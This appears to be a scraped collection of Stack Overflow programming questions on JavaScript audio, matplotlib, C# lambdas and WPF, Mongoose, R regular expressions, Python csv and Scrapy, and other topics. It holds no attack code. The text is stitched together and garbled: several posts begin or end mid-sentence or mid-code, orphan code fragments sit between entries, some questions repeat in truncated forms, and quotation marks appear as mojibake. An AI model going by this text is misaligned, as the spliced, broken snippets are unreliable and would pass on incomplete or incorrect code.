    window.AudioContext = window.AudioContext || window.webkitAudioContext;
    var audioContext = new AudioContext();

    // Create an AudioNode from the stream.
    var mediaStreamSource = audioContext.createMediaStreamSource( stream );

    // Connect it to the destination to hear yourself (or any other node for processing!)
    mediaStreamSource.connect( audioContext.destination );

//when button clicked, browser asks a permission to access microphone

jQuery("#sound_on").click(function()

 Any ideas? EDIT/UPDATE Thank you, csch, for the reference. Workaround by Karoun Kasraie worked! context = new AudioContext();

navigator.getUserMedia({ audio: true }, function(stream) {
  // the important thing is to save a reference to the MediaStreamAudioSourceNode
  // thus, *window*.source or any other object reference will do
  window.source = context.createMediaStreamSource(stream);

@TITLE:Interpolating a 3D surface known by its corner nodes and coloring it with a colormap
@CONTENT:I want to construct a 3D representation of experimental data to track the deformation of a membrane. Experimentally, only the corner nodes are known. However I want to plot the deformaiton of the overall structure and this why I want to interpolate the membrane to enable a nice colormap of it. By searching around, I came almost close to it with the following code: import numpy
from mpl_toolkits.mplot3d import Axes3D
from mpl_toolkits.mplot3d.art3d import Poly3DCollection
import matplotlib.pyplot as plt
from matplotlib import cm
from scipy.interpolate import griddata

x=numpy.array([0, 0, 1, 1])
y=numpy.array([0.5, 0.75, 1, 0.5])
z=numpy.array([0, 0.5, 1,0])

fig = plt.figure()
ax = Axes3D(fig)
verts = [zip(x, y, z)]
PC = Poly3DCollection(verts)
ax.add_collection3d(PC)

xi = numpy.linspace(x.min(),x.max(),20)
yi = numpy.linspace(y.min(),y.max(),20)
zi = griddata((x,y),z, (xi[None,:], yi[:,None]), method='linear')
xig, yig = numpy.meshgrid(xi, -yi)
ax.plot_surface(xig, yig, zi, rstride=1, cstride=1,  linewidth=0,cmap=plt.cm.jet,norm=plt.Normalize(vmax=abs(yi).max(), vmin=-abs(yi).max()))
plt.show()
 and get the following plot: The blue polygon is the surface known by its corner nodes and that I want to colormap. The colormapped surface is my best result so far. However, there are the black polygons near the top of the surface that are troubling me. I think it might be due to the fact that the surface doesn't fit the meshgrid and so the fourth corner is here a Nan. Is there a workaround to avoid these black triangles or even better a better way of colormapping a surface known only by its corner nodes? EDIT: Here is the figure with the triangulation solution given in my first comment by using the following command triang = tri.Triangulation(x, y)
ax.plot_trisurf(x, y, z, triangles=triang.triangles, cmap=cm.jet,norm=plt.Normalize(vmax=abs(yi).max(), vmin=-abs(yi).max()))

@TITLE:What does ¡§DisplayClass¡¨ name mean when calling lambda?
@CONTENT:According to this answer when code uses local variables from inside lambda methods the compiler will generate extra classes that can have name such as c__DisplayClass1. For example the following (completely useless) code: class Program
{
    static void Main()
    {
        try {
            implMain();
        } catch (Exception e) {
            Console.WriteLine(e.ToString());
        }
    }

    static void implMain()
    {
        for (int i = 0; i < 10; i++) {
            invoke(() => {
                Console.WriteLine(i);
                throw new InvalidOperationException();
            });
        }
    }
    static void invoke(Action what)
    {
        what();
    }
}
 outputs the following call stack: System.InvalidOperationException
at ConsoleApplication1.Program.<>c__DisplayClass2.<implMain>b__0()
at ConsoleApplication1.Program.invoke(Action what)
at ConsoleApplication1.Program.implMain()
at ConsoleApplication1.Program.Main()
 Note that there's c__DisplayClass2 in there which is a name of a class generated by the compiler to hold the loop variable. According to this answer c__DisplayClass "means" c --> anonymous method closure class ("DisplayClass") Okay, but what does "DisplayClass" mean here? What does this generated class "display"? In other words why is it not "MagicClass" or "GeneratedClass" or any other name?
@CODE:c__DisplayClass1 class Program
{
    static void Main()
    {
        try {
            implMain();
        } catch (Exception e) {

@TITLE:Is it possible to use optional/default parameters in a lambda expression in c#?
@CONTENT:Is there a way to use optional arguments (default parameters) with lambda expressions in c#? I have read through the documentation but can find nothing to say one way or the other. To illustrate, I can define simple method that uses an optional argument to supply a default value like so: void MyMethod(string arg = "default-value")
{ 
    Console.WriteLine(arg);
}
 What I want to know is if I am able to do the same thing using a lambda expression. // gives a syntax error
Action<string> MyMethod = (arg = "default") => Console.WriteLine(arg);
 I can work in an optional parameter with a default value using a delegate, but this seems a bit clumsy. delegate void MyDelegate(string arg = "default");
MyDelegate MyMethod = arg => Console.WriteLine(arg);
 Alternatively I could check the parameter in the lambda body, something like...  Action<string> MyMethod = (arg) => Console.WriteLine(string.IsNullOrEmpty(arg) ?
                                    "default" :
                                    arg);
 But again this seems a bit clumsy. Is it possible to use optional parameters to set a default value in a lambda expression in c#?
@CODE:void MyMethod(string arg = "default-value")
{

@TITLE:Is there a limit on length of the key (string) in JS object?
@CONTENT:So we had a case where we would have some JSON, where key is id (int) and the value is the string. But we noticed that most of the times, we look up id based on the string, so we decided to reverse it and make a string the key and the value is the id. Because that way instead of going through each item and compare values, we could just do var id = storage[text];. Below are the examples of what we did.

 I understand that now the string is the key and it's ok to get the same id for the same strings.

@TITLE:C#/WPF - Get ScrollViewer scroll position?
@CONTENT:Okay, so, everyone knows how to set the scroll position of a ScrollViewer. Entire essays and blog entries have been written about ScrollViewer.ScrollToVerticalOffset(), and there are a good few hundred questions with answers about it here. So, I enter: myScrollViewer.ScrollToVerticalOffset(280);
 ... and it so kindly scrolls to that location. The question is, what property now contains 280, so I can retrieve it later? (Hint: myScrollViewer.VerticalOffset and ContentVerticalOffset are both 0; myScrollViewer.ScrollInfo just plain doesn't exist.) EDIT: Apparently I need a more detailed demonstration. private void btnTest_Click(object sender, RoutedEventArgs e) {
  double scrollTarget = 280;
  MessageBox.Show("Target: " + scrollTarget.ToString());
  myScrollViewer.ScrollToVerticalOffset(scrollTarget);
  MessageBox.Show("Now: " + myScrollViewer.VerticalOffset);
}
 I must reiterate that this does scroll as intended. Goes right exactly where I want it to. But, myScrollViewer.VerticalOffset is set at 0.
@CODE:ScrollViewer.ScrollToVerticalOffset() myScrollViewer.ScrollToVerticalOffset(280); myScrollViewer.VerticalOffset ContentVerticalOffset myScrollViewer.ScrollInfo private void btnTest_Click(object sender, RoutedEventArgs e) {

A = new Schema({

    console.log(a);
});
 But i dont know how to get from returnet a object only c object that i need. Second if working with refs: C = new Schema({
    'title': String,
});

B = new Schema({
    'title': String,
    'c': [{ type: Schema.Types.ObjectId, ref: 'C' }]
});

A = new Schema({
    'title': String,
    'b': [{ type: Schema.Types.ObjectId, ref: 'B' }]
});
 How to populate all B, C records to get hierarchy? I was try to use something like this: A
.find({})
.populate('b')
.populate('b.c')
.exec(function(err, a){
    a.forEach(function(single_a){
        console.log('- ' + single_a.title);
        single_a.b.forEach(function(single_b){

            single_b.c.forEach(function(single_c){
                console.log('--- ' + single_c.title);
            });
        });
    });
});
 But it will return undefined for single_c.title. I there way to populate it? Thanks.

grep(pattern="[:digit:]", x=vec)
 would return 1 2 4 since they are the four elements that have digits somewhere in them. But in fact it returns 3 4. Likewise grep(pattern="^0", x=vec) returns 1 as I would expect because element 1 starts with a zero. However grep(pattern="^[:digit:]", x=vec) returns integer(0) whereas I would expect it to return 1 2 since those are the elements that start with digits. How am I misunderstanding the syntax?

@TITLE:Is it possible to use optional/default parameters in a lambda expression in c#?
@CONTENT:Is there a way to use optional arguments (default parameters) with lambda expressions in c#? I have read through the documentation but can find nothing to say one way or the other. To illustrate, I can define simple method that uses an optional argument to supply a default value like so: void MyMethod(string arg = "default-value")
{ 
    Console.WriteLine(arg);
}
 What I want to know is if I am able to do the same thing using a lambda expression. // gives a syntax error
Action<string> MyMethod = (arg = "default") => Console.WriteLine(arg);
 I can work in an optional parameter with a default value using a delegate, but this seems a bit clumsy. delegate void MyDelegate(string arg = "default");
MyDelegate MyMethod = arg => Console.WriteLine(arg);
 Alternatively I could check the parameter in the lambda body, something like...  Action<string> MyMethod = (arg) => Console.WriteLine(string.IsNullOrEmpty(arg) ?
                                    "default" :
                                    arg);
 But again this seems a bit clumsy. Is it possible to use optional parameters to set a default value in a lambda expression in c#?
@CODE:void MyMethod(string arg = "default-value")
{ 
    Console.WriteLine(arg);
} // gives a syntax error
Action<string> MyMethod = (arg = "default") => Console.WriteLine(arg); delegate void MyDelegate(string arg = "default");
MyDelegate MyMethod = arg => Console.WriteLine(arg); Action<string> MyMethod = (arg) => Console.WriteLine(string.IsNullOrEmpty(arg) ?
                                    "default" :

@CONTENT:im doing the scrumptios facebook developer tutorial for the 3.1 iOS SDK. i've managed to display my profile name from facebook, however the FBProfilePictureView wont show the picture heres the code for iboutlet @property (strong, nonatomic) IBOutlet FBProfilePictureView *useProfileImage;
 here is what i used to display the pic self.useProfileImage.profileID = user.id;
 i have confirmed that the it changed the profileid variable of the image by displaying it in a label. when i first ran the project i had this error "2012-05-18 04:04:11.620 Scrumptious[6548:f803] Unknown class FBProfilePictureView in Interface Builder file." and solved it they way the FB tutorial suggested- by adding [FBProfilePictureView class]; to "applicationdidfinishlaunching: withoptions" in the app delegate. any idea why the picture wouldnt show? link to the tutorial
@CODE:@property (strong, nonatomic) IBOutlet FBProfilePictureView *useProfileImage; self.useProfileImage.profileID = user.id; [FBProfilePictureView class];

@TITLE:C#/WPF - Get ScrollViewer scroll position?
@CONTENT:Okay, so, everyone knows how to set the scroll position of a ScrollViewer. Entire essays and blog entries have been written about ScrollViewer.ScrollToVerticalOffset(), and there are a good few hundred questions with answers about it here. So, I enter: myScrollViewer.ScrollToVerticalOffset(280);
 ... and it so kindly scrolls to that location. The question is, what property now contains 280, so I can retrieve it later? (Hint: myScrollViewer.VerticalOffset and ContentVerticalOffset are both 0; myScrollViewer.ScrollInfo just plain doesn't exist.) EDIT: Apparently I need a more detailed demonstration. private void btnTest_Click(object sender, RoutedEventArgs e) {
  double scrollTarget = 280;
  MessageBox.Show("Target: " + scrollTarget.ToString());
  myScrollViewer.ScrollToVerticalOffset(scrollTarget);
  MessageBox.Show("Now: " + myScrollViewer.VerticalOffset);
}
 I must reiterate that this does scroll as intended. Goes right exactly where I want it to. But, myScrollViewer.VerticalOffset is set at 0.
@CODE:ScrollViewer.ScrollToVerticalOffset() myScrollViewer.ScrollToVerticalOffset(280); myScrollViewer.VerticalOffset ContentVerticalOffset myScrollViewer.ScrollInfo private void btnTest_Click(object sender, RoutedEventArgs e) {
  double scrollTarget = 280;
  MessageBox.Show("Target: " + scrollTarget.ToString());
  myScrollViewer.ScrollToVerticalOffset(scrollTarget);
  MessageBox.Show("Now: " + myScrollViewer.VerticalOffset);
} myScrollViewer.VerticalOffset VerticalOffset ContentVerticalOffset

@TITLE:Mongoose populate embedded
@CONTENT:I use Mongoose.js and cannot solve problem with 3 level hierarchy document. There 2 ways to do it. First - without refs. C = new Schema({
    'title': String,
});

B = new Schema({
    'title': String,
    'c': [C]
});

A = new Schema({
    'title': String,
    'b': [B]
});
 I need to show C record. How can i populate / find it, knowing only _id of C? I was try use: A.findOne({'b.c._id': req.params.c_id}, function(err, a){
    console.log(a);
});
 But i dont know how to get from returnet a object only c object that i need. Second if working with refs: C = new Schema({
    'title': String,
});

B = new Schema({
    'title': String,
    'c': [{ type: Schema.Types.ObjectId, ref: 'C' }]
});

A = new Schema({
    'title': String,
    'b': [{ type: Schema.Types.ObjectId, ref: 'B' }]
});
 How to populate all B, C records to get hierarchy? I was try to use something like this: A
.find({})
.populate('b')
.populate('b.c')
.exec(function(err, a){
    a.forEach(function(single_a){
        console.log('- ' + single_a.title);
        single_a.b.forEach(function(single_b){
            console.log('-- ' + single_b.title);
            single_b.c.forEach(function(single_c){
                console.log('--- ' + single_c.title);
            });
        });
    });
});
 But it will return undefined for single_c.title. I there way to populate it? Thanks.
@CODE:C = new Schema({
    'title': String,
});

B = new Schema({
    'title': String,
    'c': [C]
});

A = new Schema({
    'title': String,

@TITLE:R regular expressions: unexpected behavior of ¡§[:digit:]¡¨
@CONTENT:I'd like to extract elements beginning with digits from a character vector but there's something about POSIX regular expression syntax that I don't understand. I would think that vec <- c("012 foo", "305 bar", "other", "notIt 7")
grep(pattern="[:digit:]", x=vec)
 would return 1 2 4 since they are the four elements that have digits somewhere in them. But in fact it returns 3 4. Likewise grep(pattern="^0", x=vec) returns 1 as I would expect because element 1 starts with a zero. However grep(pattern="^[:digit:]", x=vec) returns integer(0) whereas I would expect it to return 1 2 since those are the elements that start with digits. How am I misunderstanding the syntax?
@CODE:vec <- c("012 foo", "305 bar", "other", "notIt 7")

@TITLE:Compare one String with multiple values in one expression
@CONTENT:I have one String variable, str with possible values, val1, val2 and val3. I want to compare (with equal case) str to all of these values using an if statement, for example: if("val1".equalsIgnoreCase(str)||"val2".equalsIgnoreCase(str)||"val3.equalsIgnoreCase(str))
{
      //remaining code
}
 Is there a way to avoid using multiple OR (||) operators and compare values in one expression? For example, like this:  if(("val1" OR "val2" OR "val3").equalsIgnoreCase(str)   //this is only an idea.
@CODE:str val1 val2 val3 str if("val1".equalsIgnoreCase(str)||"val2".equalsIgnoreCase(str)||"val3.equalsIgnoreCase(str))
{
      //remaining code
} if(("val1" OR "val2" OR "val3").equalsIgnoreCase(str)   //this is only an idea.

 Without changing my XHTML, anyone know how I can parse this document successfully? Edit Per the comments given, I removed the term "well-formed" from my original question. I'm still really interested in how to make this exception go away without changing the text I'm parsing (which I don't have control over). For the purposes of this question, you can assume the "--" within comments is the only violation of the term "well-formed."

@TITLE:Python requests fetch a file from a local url
@CONTENT:I am using Python's requests library in one method of my application. The body of the method looks like this: def handle_remote_file(url, **kwargs):
    response = requests.get(url, ...)
    buff = StringIO.StringIO()
    buff.write(response.content)
    ...
    return True
 I'd like to write some unit tests for that method, however, what I want to do is to pass a fake local url such as: class RemoteTest(TestCase):
    def setUp(self):
        self.url = 'file:///tmp/dummy.txt'

    def test_handle_remote_file(self):
        self.assertTrue(handle_remote_file(self.url))
 When I call requests.get with a local url, I got the KeyError exception below: requests.get('file:///tmp/dummy.txt')

79         pool = pool_cls(host, port, **self.connection_pool_kw)

 The question is how can I pass a local url to requests.get? PS: I made up the above example. It possibly contains many errors. Thanks a lot.

@TITLE:Creating a generic scrapy spider
@CONTENT:My question is really how to do the same thing as a previous question, but in Scrapy 0.14. Using one Scrapy spider for several websites Basically, I have GUI that takes parameters like domain, keywords, tag names, etc. and I want to create a generic spider to crawl those domains for those keywords in those tags. I've read conflicting things, using older versions of scrapy, by either overriding the spider manager class or by dynamically creating a spider. Which method is preferred and how do I implement and invoke the proper solution? Thanks in advance. Here is the code that I want to make generic. It also uses BeautifulSoup. I paired it down so hopefully didn't remove anything crucial to understand it. class MySpider(CrawlSpider):

allowed_domains = ['somedomain.com', 'sub.somedomain.com']
start_urls = ['http://www.somedomain.com']

    Rule(SgmlLinkExtractor(allow=('/2012/03/')), callback='parse_item'),
)

def parse_item(self, response):
    contentTags = []

    soup = BeautifulSoup(response.body)

    contentTags = soup.findAll('p', itemprop="myProp")

    for contentTag in contentTags:
        matchedResult = re.search('Keyword1|Keyword2', contentTag.text)

@CONTENT:I try to follow the facebook-android tutorial from here: https://developers.facebook.com/docs/mobile/android/build/#sample I am working in windows 7. I have installed the Git and cloned the GitHub repository running this command in the git Bash -> git clone git://github.com/facebook/facebook-android-sdk.git Everything seemed fine and I got the folder ¡§facebook-android-sdk¡¨ in my ¡§Users¡¨ folder. But when I try to import the project in eclipse workspace so to use it as a library I cannot make it work. I¡¦ve tried 3 things: Create the project from existing source (as the tutorial says), when I browse to the ¡§facebook-android-sdk¡¨ folder and create the project, I get this message in my cosole: [2011-12-04 14:01:49 - com_facebook_android] AndroidManifest.xml file missing! Also in the package explorer, the src folder seems to be empty. If I try to import the project when I browse the folder I get a message ¡§No projects are found to import¡¨ I also tried to make a test project where I copied all the classes of the android facebook sdk so that I can use them. It worked up to a degree, but it does not seem a proper thing to do. So what do I do wrong? Is there something else I should do using the git repository (I am completely new to git)? Or is there something wrong that I do when I try to import the project? I¡¦ve searched the problem here and in other forums but didn¡¦t find a satisfying answer (or maybe I did not understand it). Please help! EDIT: I've tried one 4th thing 4: I extracted the jar out of the project I created in 1 (even if it had an error). It is working in terms that I can compile the code of the facebook-android tutorial step 6.2 - https://developers.facebook.com/docs/mobile/android/build/#sample. So far it seems that everything goes ok. But I do not know if this is right or I should have problems in the future..

@CONTENT:I need to shell out to a process while setting an environment variable for it. I tried this one-liner: system "RBENV_VERSION=system ruby extconf.rb"
 This syntax works in shell script but not from ruby. (Update: turns out this syntax works from ruby after all, but I failed to see its effect due to my particular use-case.) So I'm doing this: rbenv_version = ENV['RBENV_VERSION']
ENV['RBENV_VERSION'] = 'system'
begin
  system "ruby extconf.rb"
ensure
  ENV['RBENV_VERSION'] = rbenv_version
end
 I'm forced to such a long expression because I don't want to override the environment variable permanently if it already had a value. Anything shorter that comes to your mind?

Is there plans to get implemented in next versions? Thanks! UPDATE String interpolation is going to be in scala 2.10 which you can try out since scala 2.10.RC1 is out (20/10/2012). You can check out this SIP for scala 2.11 which states that interpolated strings in the pattern matcher will be valid syntax. With the new string interpolation you can do something like this: val age = 28
val name = "Gerry"

s"My name is $name and I am $age years old"
res0: String = My name is Gerry and I am 28 years old
 But try out the documentation on all the interpolators that are available at the moment. Note that you can define your own interpolators! Try this link for more info.
@CODE:val age = 28
val name = "Gerry"

@CONTENT:I'm revisiting some old code, and have found it doesn't work with jQuery 1.6 because it cannot find $.handleError(). A quick search of the jQuery code shows nothing, so I guess this function has been removed/replaced.

-- The proposed non-unique index should behave identically to

 Again, the goal is to create the non-unique index within the CREATE TABLE statement, not after it. For what it's worth, I did not find the [SQL Server Books Online entry for CREATE TABLE] to be helpful. Also, [This Question] is nearly identical, but the accepted answer does not apply.
@CODE:CREATE TABLE MyTable(

@TITLE:CSVWriter not saving data to file - WHY?
@CONTENT:Python newbie getting a bit frustrated with the csv module. At this rate, it would have been easier if I wrote the file parser myself, but I want to do things the Pythonic way .... I have written a little python script that should save my data into a CSV file. Here is a snippet of my code: import csv

wrtr = csv.writer(open('myfile.csv','wb'),delimiter=',', quotechar='"')

for row in rows:
    wrtr.writerow([row.field1,row.field2,row.field3])
 The file myfile.csv is created successfully, yet it is empty - but has a lock on it, as its still being used by the Python process. It seems that the data has been written to the file in memory, but it has not yet been flushed to disk. Since the Python process is holding a lock on the file, then I assume that I am responsible for releasing the lock. Here are my questions: How do I get python to flush to disk How do I close the file that was opened in the csv.writer() method?
@CODE:import csv

wrtr = csv.writer(open('myfile.csv','wb'),delimiter=',', quotechar='"')

@CONTENT:I've been using WxPython and I've tried Tk, but it seems that, while both are good and I'll likely use them for other projects, neither of those appear to be capable of accomplishing the things that I want for my current project (which is fine, they're good at what they do). Basically what I'm looking for is something that will allow me to make rich graphical GUIs. My specific goal is a window that will draw bitmap buttons, resize the parent window automatically to fit them, and possibly animate the resize with a slide effect and have the buttons fade in. Also being able to have my own window border style instead of the inbuilt one is important to me. This particular project will be Windows only, so non-portable libraries are fine in this case, though portable ones would be great too. If I missed how this can be done in either WxPython or Tk, I'm all ears.

@TITLE:Print the keys of an array
@CONTENT:I could not figure out how to pass a variable number of variables into a function. I thought passing in an array and using the array keys for the variables names could replace the need to pass extra variables into the function, and it worked (I'm sure there is a better way to accomplish this, suggestions welcome). However, I can't seem to get the keys out of the array inside the function. The array:   $parameters[day] = 1;
  $parameters[month] = 8;
  $parameters[year] = 2010; 
 Inside the function: foreach(key($parameters) as $key)

@TITLE:Out of memory when creating a lot of objects C#
@CONTENT:I'm processing 1 million records in my application, which I retrieve from a MySQL database. To do so I'm using Linq to get the records and use .Skip() and .Take() to process 250 records at a time. For each retrieved record I need to create 0 to 4 Items, which I then add to the database. So the average amount of total Items that has to be created is around 2 million. IQueryable<Object> objectCollection = dataContext.Repository<Object>();
int amountToSkip = 0;
IList<Object> objects = objectCollection.Skip(amountToSkip).Take(250).ToList();
while (objects.Count != 0)
        {
            using (dataContext = new LinqToSqlContext(new DataContext()))
            {
                foreach (Object objectRecord in objects)
                {
                    // Create 0 - 4 Random Items
                    for (int i = 0; i < Random.Next(0, 4); i++)
                    {
                        Item item = new Item();
                        item.Id = Guid.NewGuid();
                        item.Object = objectRecord.Id;
                        item.Created = DateTime.Now;
                        item.Changed = DateTime.Now;
                        dataContext.InsertOnSubmit(item);

            objects = objectCollection.Skip(amountToSkip).Take(250).ToList();
        }

@CONTENT:To create a delegate from a method you can use the compile type-safe syntax: private int Method() { ... }

// and create the delegate to Method...
Func<int> d = Method;
 A property is a wrapper around a getter and setter method, and I want to create a delegate to a property getter method. Something like public int Prop { get; set; }

Func<int> d = Prop;
// or...
Func<int> d = Prop_get;
 Which doesn't work, unfortunately. I have to create a separate lambda method, which seems unnecessary when the getter method matches the delegate signature anyway: Func<int> d = () => Prop;
 In order to use the delegate method directly, I have to use nasty reflection, which isn't compile type-safe: // something like this, not tested...
MethodInfo m = GetType().GetProperty("Prop").GetGetMethod();
Func<int> d = (Func<int>)Delegate.CreateDelegate(typeof(Func<int>), m);
 Is there any way of creating a delegate on a property getting method directly in a compile-safe way, similar to creating a delegate on a normal method at the top, without needing to use an intermediate lambda method?

@CONTENT:One of the issues I have had in porting some stuff from Solaris to Linux is that the Solaris compiler expands the macro __FILE__ during preprocessing to the file name (e.g. MyFile.cpp) whereas gcc on Linux expandeds out to the full path (e.g. /home/user/MyFile.cpp). This can be reasonably easily resolved using basename() but....if you're using it a lot, then all those calls to basename() have got to add up, right? Here's the question. Is there a way using templates and static metaprogramming, to run basename() or similar at compile time? Since __FILE__ is constant and known at compile time this might make it easier. What do you think? Can it be done?

@TITLE:PHP __call vs method_exists
@CONTENT:The Project I'm working on contains something like a wrapper for call_user_func(_array) which does some checks before execution. One of those checks is method_exists (In Case the supplied first argument is an instance of a class and the second is a method name) The other is_callable. The function will throw an exception if one of those checks fails. My Code contains an array with function names (setFoo, setBar, etc.) and the php magic function for overloading (__call) which handles setting, replacing and deletion of certain variables (better certain array elements). The Problem: method_exists will return false if the function is not defined. Do I have any chance to get a true if the __call function does proper handling of the request?

@TITLE:What is the minimum Cross AppDomain communication performance penalty?
@CONTENT:I am trying to minimize the performance penalty of communicating across AppDomains in the same machine. In my toy example, Class A is loaded in AppDomain 1. It creates an AppDomain 2 and loads there an instance of Class 2 (Class 2 inherits from MarshalByRef) getting back a proxy. Then Class 1 calls repeatedly a method on the proxy that returns no values. I get the following results: No AppDomains, both classes are loaded in the same AppDomain and the first calls repetedly the method on the second (the method has no parameters): 24 million method calls/sec Two AppDomain as described above, method has no parameters or "bleeding" string parameters: 340.000 methods calls/sec Two AppDomains as described above, one serializable parameter (array of two strings): 64.000 method calls/sec Although I understand the performance penalty between 2 and 3 (serialization), I really don't understand why I am 100 times slower from case 1 to case 2. To my understanding, once the proxy is created all subsequent method invocations must be really fast since no data are being marshalled from one AppDomain to the other. Does anybody now why communicating across AppDomains is so slow? Am I doing something wrong? PS1. The only tip that I have on this is here: "And the cost of crossing an AppDomain boundary is embarrassing.". I was guessing he refers to serialization... PS2. I don't count the AppDomain or Proxy creation time (my benchmarks start in the first method invocation) PS3. I am using .NET 3.5 in a WinXP SP3 machine.

Sorry for the confusion. Actually the comments on that post answer my question, as Nikhil has pointed out correctly. We realized that CPython is far ahead of us in this area, and that we are lacking in compatibility. After serious brainstorming (and a few glasses of wine), we decided that introducing a Global Interpreter Lock in Jython would solve the entire issue! Now, what's the status here? The "differences" page on sourceforge doesn't mention the GIL at all. Is there any official source I have overlooked?

@TITLE:One complex query vs Multiple simple queries
@CONTENT:What is actually better? Having classes with complex queries responsible to load for instance nested objects? Or classes with simple queries responsible to load simple objects? With complex queries you have to go less to database but the class will have more responsibility. Or simple queries where you will need to go more to database. In this case however each class will be responsible for loading one type of object. The situation I'm in is that loaded objects will be sent to a Flex application (DTO's).

@LINK:/questions/625708/where-to-put-comments-in-an-if-then-else-construct
@TITLE:Where to put comments in an IF THEN ELSE construct
@CONTENT:I never decided on what the best way is to comment IF-THEN-ELSE constructs, so I never standardized on a consistent way to comment them. I appreciate any insights. Some options: a) IF (blabla) { 
   // this comment explains what happens in the IF case
   dothis();
} else { 
  // this comment explains what happens in the ELSE case
   dosomethingelse();
}
 drawback: in case of multiple dothis() statements, I like to comment the major blocks, and in that case it isn't always clear if the IF-comment belongs to the first dothis() block or to the whole IF case or b) IF (blabla) { // this comment explains what happens in the IF case
   dothis();
} else { // this comment explains what happens in the ELSE case
   dosomethingelse();
}
 drawback: only works for short comments. I usually comment IF-THEN-ELSE constructs if the IF and ELSE case isn't directly clear from the code, which typically requires a comment longer than one line. or c) // if the following happens
IF (blabla) { // then do this
   dothis();
} else { // or else do this
   dosomethingelse();
}
 PS: I know about "the code should be self explanatory", but this isn't always the case...
@CODE:IF (blabla) { 
   // this comment explains what happens in the IF case
   dothis();
} else { 
  // this comment explains what happens in the ELSE case
   dosomethingelse();
} IF (blabla) { // this comment explains what happens in the IF case
   dothis();
} else { // this comment explains what happens in the ELSE case
   dosomethingelse();
} // if the following happens
IF (blabla) { // then do this

} else { // or else do this

When I try to enter the site from a deny IP, I see an Apache message: Found

@CONTENT:Is this just a bit of historical cruft left over from the 1950s or is there some reason syntactically why multi-expression bodies of (if) forms require (progn)? Why can't you wrap the multiple expressions in a set of parentheses like with (let):    (if some-cond

     (exp4)) ; single exp "else"
 It appears it would be trivial to write a macro to test each body to see first if it is a list and then if it is, if its first element is also a list (and thus not a function invocation) and then to wrap its subcomponents inside a (progn) accordingly.

@CONTENT:I have written a custom Rails model. This model is backed by an actually server not by a database table (so it does not inherit from ActiveRecord::Base). In order to get the requested information from the server I open a SSH connection to it. Because rails does not reuse object a new object, as well as a new SSH connection to the server, will be created for ever request that is received. To reduce server stress I want to close the SSH connection before the model object gets garbage collected. I am wondering does ruby provide a notification mechanism to inform the object that it will be destroyed? If so I could use this notification to know when to close the SSH connections. If not I will need to do it manual when I know I am finished with the object. If I need to manually take care of this, can I explicitly destroy the object? Or is the best i can do is object = nil?

@CONTENT:I maintain an old PC-only application written in Delphi 7. Although Delphi has served me very well in the past I now only use it for this one application and find my skills with the language diminishing. Its syntax is too different from my 'day job' languages of Java/Ruby so it takes me longer to get into the groove of writing new code, plus it is so old I have not used many interfaces so the code is not managed which seems ancient to me now! Many of my users are moving to Vista which may run the app in compatibility mode or may have GPF problems depending on how their PC is configured by their IT department, so I have to do some maintenance on the application. I'm wondering if I should jump to a more familiar stack. Is there an automated tool that will do the legwork of converting the code base to C#, leaving me to concentrate on the conversion on any non-standard components? I'm using an embedded database component called AbsoluteDatabase which is BDE compatible and using standard SQL throughout, and a native Delphi HTML browser component which can be swapped out with something from the Microsoft world. How good are these conversion tools?

@TITLE:SpriteKit Nodes Sticking to Edges of Scene / Not Bouncing
@CONTENT:I've searched this one and I think there must be some parameter to fix this but I haven't found it. I have a scene in SpriteKit where I want some circles/balls to bounce around and maintain any velocity they have indefinitely. They should bounce off the edges of the scene. This is working if they are moving fast enough, or hit at a fairly sharp angle, but if they are going slower and coming in close to the plane of the edge, they keep moving (which is good) but they "Stick" to the edges. This sticking is what I don't want. They should rebound even if going very slowly. To set up the edges, I used: SKPhysicsBody *borderBody = [SKPhysicsBody bodyWithEdgeLoopFromRect:self.frame];
self.physicsBody = borderBody;
self.physicsBody.friction = 0.0;
self.physicsBody.restitution = 1.0;
self.physicsBody.linerDamping = 0.0;
self.physicsBody.angularDamping = 0.0;
self.physicsBody.affectedByGravity = NO;
 And on the circle nodes, I have similar settings, like: ball.usesPresciseCollisionDetection = YES;
ball.dynamic = YES;
ball.restitution = 1.0;
ball.linearDamping = 0.0;
ball.angularDamping = 0.0;
ball.friction = 0.0;
 I have the gravity in my scene at zero. I add an impulse to the nodes and they start bouncing- It seems very close, as things bounce around, but then if there are any that are moving slowly and come in at a shallow angle, they "hug" the edges. I'll try including an illustration below to help visualize. http://i.imgur.com/Rpr7luY.png I've tried playing with lots of the PhysicsBody settings, but can't get things to stop sticking. Thanks!
@CODE:SKPhysicsBody *borderBody = [SKPhysicsBody bodyWithEdgeLoopFromRect:self.frame];

 According to the documemtation: A special-form is a reserved-identifier that is used in an expression as if it was a program defined procedure name but which has special syntactic rules for its argument. But there is no mention of the purpose of these keywords, nor there number, type of parameters and return values. Some are documented in other places: Array returns a literal array with an variable number of parameters Input and InputB are used with line LBound and Ubound returns respectively tho first and last index of an array, same as VB My question is: What is the purpose of Circle and Scale and how are they used ? I found the correct (odd) syntax of Circle which is the same as the BASIC statement CIRCLE(xcenter, ycenter), radius[,[color][,[start],[end][,aspect]]]
 and gives no syntax error (I didn't find any mention of Scale though it doesn't seem to have any parameters) but I can't assign it to a variable, and if I try to run the code below (which is syntaxically correct) I get the following error: Method not valid without suitable object code: Sub test1()
    Circle (5, 5), 10
End Sub

Sub test2()
    Scale
End Sub
@CODE:special-form = ¡§Array¡§ / ¡§Circle¡¨ / ¡§Input¡¨ / ¡§InputB¡¨ / ¡§LBound¡¨ / ¡§Scale¡¨ / ¡§UBound¡¨ CIRCLE(xcenter, ycenter), radius[,[color][,[start],[end][,aspect]]] Sub test1()

@LINK:/questions/21351617/web-api-request-content-is-empty-in-action-filter
@TITLE:Web Api Request Content is empty in action filter
@CONTENT:I have an attribute named Log that tries to log content of request and response in to a text file. I've put that over my Controller to cover all the actions. In LogAttribute I'm reading content as string (ReadAsStringAsync) so I don't lose request body. public class LogAttribute : ActionFilterAttribute
{
    // ..
    public override void OnActionExecuting(HttpActionContext actionContext)
    {
        // stuff goes here
        var content = actionContext.Request.Content.ReadAsStringAsync().Result; 
        // content is always empty because request body is cleared
    }

    public override void OnActionExecutedHttpActionExecutedContext actionExecutedContext)
    {
        // other stuff goes here
        var content = actionContext.Request.Content.ReadAsStringAsync().Result;
        // content is always empty because request body is cleared
    }

    // ..
}
 On the other hand I've put FromBody attribute before my action parameter class to take advantage of its benefits. [Log]
public class SomethingController
{
    public HttpResponseMessage Foo([FromBody] myModel)
    {
        // something
    }
}
